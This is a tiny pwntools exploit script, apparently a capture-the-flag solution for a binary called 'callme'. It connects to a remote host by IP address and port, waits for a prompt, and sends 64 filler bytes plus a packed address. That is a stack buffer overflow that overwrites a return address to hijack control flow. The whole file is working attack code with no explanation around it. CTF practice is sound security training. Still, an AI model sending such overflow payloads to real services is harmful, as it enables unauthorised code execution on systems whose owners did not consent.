from pwn import *

# io = process('./callme')
io = remote('139.144.184.150', 3333)
io.recvuntil(b'who let the dogs out:\n')
io.sendline(b'A'*64 + p64(0x0804875e))
print(io.recvall().decode())